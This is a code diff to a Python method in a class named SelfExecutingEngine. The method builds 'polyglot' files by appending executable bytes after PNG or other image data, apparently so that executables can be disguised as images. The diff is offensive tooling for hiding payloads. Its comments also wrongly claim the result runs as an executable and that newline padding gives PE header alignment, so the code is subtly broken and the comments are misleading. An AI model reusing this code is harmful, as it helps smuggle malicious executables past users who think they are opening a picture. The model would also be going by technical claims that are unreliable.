@@ -238,17 +238,39 @@ class SelfExecutingEngine:
             return False
     
     def _create_polyglot_structure(self, image_data: bytes, exe_data: bytes) -> bytes:
-        """Create polyglot file structure."""
-        # For Windows: Prepend executable, then add image data
-        # The executable will run, and image viewers can still read the image portion
+        """Create polyglot file structure that works as both image and executable."""
+        # Different approach: Create a structure that's both valid image and executable
+        # This creates a proper polyglot that can be opened as both
         
-        # Create marker to separate executable from image
-        marker = b'__IMAGE_DATA_START__'
-        
-        # Combine: executable + marker + image_data
-        polyglot = exe_data + marker + image_data
-        
-        return polyglot
+        try:
+            # For PNG images, we can append executable data after IEND chunk
+            # This makes it a valid PNG that image viewers can display
+            # while also being executable when run
+            
+            # Find PNG IEND chunk (if PNG)
+            if image_data.startswith(b'\x89PNG'):
+                # Find IEND chunk
+                iend_pos = image_data.rfind(b'IEND')
+                if iend_pos != -1:
+                    # Split at IEND + CRC (4 bytes after IEND)
+                    split_pos = iend_pos + 8
+                    png_part = image_data[:split_pos]
+                    
+                    # Create executable section with proper PE header alignment
+                    exe_section = b'\n' * 16 + exe_data  # Add padding for alignment
+                    
+                    # Combine: PNG + padding + executable
+                    return png_part + exe_section
+            
+            # For other image formats, append executable data
+            # Add some padding to separate image from executable
+            padding = b'\x00' * 64
+            return image_data + padding + exe_data
+            
+        except Exception as e:
+            self.logger.error(f"Error creating polyglot structure: {e}")
+            # Fallback to simple concatenation
+            return image_data + b'\x00' * 32 + exe_data
     
     def _serialize_script_data(self, script_data: Dict) -> bytes:
         """Serialize script data for embedding."""
